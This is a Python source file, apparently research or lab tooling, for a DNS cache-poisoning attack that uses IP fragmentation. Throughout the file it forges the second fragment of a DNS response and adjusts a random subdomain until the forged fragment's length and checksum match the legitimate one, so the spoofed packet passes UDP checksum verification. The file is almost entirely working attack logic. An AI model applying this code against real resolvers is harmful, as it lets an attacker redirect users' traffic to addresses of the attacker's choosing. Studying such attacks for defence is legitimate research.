from attack import _build_origin_fake_response, _build_standard_response
from utils import checksum
import uuid
import random
import struct
from scapy.all import DNS, DNSQR, DNSRR, raw
FAKE_IP = "1.1.1.1"
CHAIN_PREFIX = b'c'
ATTACKER_DOMAIN = b'example.com'
CHAIN_LENGTH = 55
SRC_IP = "10.0.0.3"
DST_IP = "10.0.0.2"
SRC_PORT = 53
# DST_PORT = random.randint(0, 65535)
DST_PORT = 53
MTU = 1500
IP_HEAD = 20
UDP_HEAD = 8
PAYLOAD = MTU - IP_HEAD - UDP_HEAD

def build_fake_respones(qname: bytes) -> bytes:
    origin = _build_origin_fake_response(qname, "x")
    std = _build_standard_response(qname)
    ckm1, len1 = check(std)
    ckm2, len2 = check(origin)
    _iter = 0
    sub = None
    while len1 != len2:
        if _iter >= 2:
            raise ValueError("[ERROR] can't make length equal")
        print("[WARN] length not equal!!!")
        print(f"[INFO] byte1: {len1} bytes")
        print(f"[INFO] byte2: {len2} bytes")
        if len1 < len2:
            raise ValueError("[ERROR] can't modify domain because length increase")
        elif ((len1 - len2) % 2 != 0):
            raise ValueError("[ERROR] odd length difference should not exist")
        sub = "x" + "x" * ((len1 - len2) // 2)
        print(f"[INFO] the subdomain is {sub}")
        origin = _build_origin_fake_response(qname, sub)
        ckm2, len2 = check(origin)
        _iter += 1
    _iter = 0
    print("[INFO] length equal")
    while ckm1 != ckm2:
        if _iter >= 2:
            raise ValueError("[ERROR] can't make checksum equal")
        print("[WARN] checknum not equal!!!")
        print(f"[INFO] byte1: {ckm1}")
        print(f"[INFO] byte2: {ckm2}")
        pos = find(origin, sub)
        print(f"[INFO] the pos is {pos}")
        new_sub = fake(ckm1, ckm2, sub, pos)
        origin = _build_origin_fake_response(qname, new_sub)
        ckm2, len2 = check(origin)
        print(f"[INFO] the new subdomain is {new_sub}")
        _iter += 1
    print("[INFO] check: ")
    eq = cmp(std, origin)
    if eq:
        print("[INFO] terminated")
    else:
        raise ValueError("[ERROR] please re-choose your victim-domain")
    print(f"[INFO] final check: ")
    std_checksum = checksum(SRC_IP, DST_IP, SRC_PORT, DST_PORT, std)
    fake_checksum = checksum(SRC_IP, DST_IP, SRC_PORT, DST_PORT, origin)
    if std_checksum == fake_checksum:
        print(f"[INFO] stimulate check pass!!!")
    else:
        raise ValueError(f"[ERROR] stimulate check failed!!!")
        

def check(bytes: bytes) -> tuple[int]:
    second_packet = bytes[PAYLOAD: ]
    if len(second_packet) % 2 != 0:
        second_packet += b'\x00'
    total_sum = 0
    for i in range(0, len(second_packet), 2):
        # 从字节流中解包出一个16位的无符号短整型
        word = struct.unpack('!H', second_packet[i:i+2])[0]
        total_sum += word
    return total_sum, len(second_packet)

def cmp(byte1: bytes, byte2: bytes) -> bool:
    ckm1, len1 = check(byte1)
    ckm2, len2 = check(byte2)
    if len1 != len2:
        print("[ERROR] length not equal!!!")
        print(f"[INFO] byte1: {len1} bytes")
        print(f"[INFO] byte2: {len2} bytes")
        return False
    if ckm1 != ckm2:
        print("[ERROR] checknum not equal!!!")
        print(f"[INFO] byte1: {ckm1}")
        print(f"[INFO] byte2: {ckm2}")
        return False
    print("[INFO] check pass!!!")
    return True

def contribute(data_str: str, pos: tuple, encoding: str = 'utf-8') -> int:
    byte_list = data_str.encode(encoding)
    total_sum = 0
    for i, byte_val in enumerate(byte_list):
        factor = 0
        for p in pos:
            if (i + p - 1) % 2 == 0:
                factor += 256  # 高位字节
            else:
                factor += 1   # 低位字节
        total_sum += byte_val * factor
    return total_sum

ALPHANUMERIC_BYTES = set(
    list(range(ord('0'), ord('9') + 1)) +
    list(range(ord('A'), ord('Z') + 1)) +
    list(range(ord('a'), ord('z') + 1))
)

def fake(std: int, now: int, data_str: str, pos: tuple, encoding="utf-8") -> str:
    total_delta = std - now
    
    if total_delta == 0:
        return data_str

    original_bytes = list(data_str.encode(encoding))
    n_bytes = len(original_bytes)
    modified_bytes = original_bytes[:]

    # 检查原始字符串是否合法
    for byte_val in original_bytes:
        if byte_val not in ALPHANUMERIC_BYTES:
            raise ValueError(f"原始字符串 '{data_str}' 包含非字母数字字符，无法进行伪造。")

    factors = [0] * n_bytes
    for i in range(n_bytes):
        factor = 0
        for p in pos:
            if (i + p - 1) % 2 == 0:
                factor += 256
            else:
                factor += 1
        factors[i] = factor

    remaining_delta = total_delta
    for i in range(n_bytes):
        if remaining_delta == 0:
            break
        
        factor = factors[i]
        if factor == 0:
            continue
            
        ideal_change = remaining_delta // factor
        
        # --- 新的核心逻辑：寻找合法的 actual_change ---
        actual_change = 0
        current_byte_val = modified_bytes[i]

        if ideal_change > 0:
            # 从 ideal_change 向下搜索到 1
            for c in range(ideal_change, 0, -1):
                if (current_byte_val + c) in ALPHANUMERIC_BYTES:
                    actual_change = c
                    break
        elif ideal_change < 0:
            # 从 ideal_change 向上搜索到 -1
            for c in range(ideal_change, 0, 1):
                if (current_byte_val + c) in ALPHANUMERIC_BYTES:
                    actual_change = c
                    break
        # ---------------------------------------------
        
        if actual_change != 0:
            modified_bytes[i] += actual_change
            remaining_delta -= actual_change * factor
        
    if remaining_delta != 0:
        raise ValueError(
            f"无法伪造和。在字母数字约束下，修改'{data_str}'后仍有 {remaining_delta} 的差值无法弥补。"
        )
    return bytes(modified_bytes).decode(encoding, errors='ignore')


def find(bytes: bytes, search_str: str, encoding: str = "utf-8") -> tuple[int, ...]:
    try:
        search_bytes = search_str.encode(encoding)
        if not search_bytes:
            return tuple()

        positions = []
        current_offset = 0
        
        while True:
            found_index = bytes.find(search_bytes, current_offset)
            if found_index == -1:
                break
            
            if found_index % 2 == 0:
                positions.append(1)
            else:
                positions.append(2)
            current_offset = found_index + 1
        return tuple(positions)
    except Exception as e:
        print(f"[ERROR] when catch pos: {e}")
        raise

if __name__ == "__main__":
    # sub = "99a46875"
    # data = build_oversized_response(DNS(qd=DNSQR(qname=b'www.example.com')))
    # with open("new.hex", "wb") as file:
        # file.write(data)
    
    # with open("payload.hex", "wb") as file:
    #     file.write(data[PAYLOAD:])
    sub = uuid.uuid4().hex[:8]
    print(sub)
    build_fake_respones(f"{sub}.{ATTACKER_DOMAIN.decode()}".encode())
    # std_data = _build_standard_response(f"{sub}{ATTACKER_DOMAIN.decode()}".encode())
    # fake_data = _build_origin_fake_response(f"{sub}{ATTACKER_DOMAIN.decode()}".encode())
    # with open("std.hex", "wb") as file:
    #     file.write(std_data[PAYLOAD:])

    # print(cmp(std_data, fake_data))
    # # with open("fake.hex", "wb") as file:
    # #     file.write(fake_data)

    # sec_fake_data = fake_data[PAYLOAD:]
    # with open("payload.hex", "wb") as file:
    #     file.write(sec_fake_data)
    # # with open("origin.hex", "wb") as file:
    # #     file.write(std_data[PAYLOAD:])

    # # print(f"std: {len(std_data)} bytes")
    # # print(f"fake: {len(fake_data)} bytes")
    # # print(f"sec fake: {len(sec_fake_data)} bytes")
    # std_checksum = checksum(SRC_IP, DST_IP, SRC_PORT, DST_PORT, std_data)
    # fake_checksum = checksum(SRC_IP, DST_IP, SRC_PORT, DST_PORT, fake_data)
    # print(f"std: ({std_checksum})")
    # print(f"fake: ({fake_checksum})")

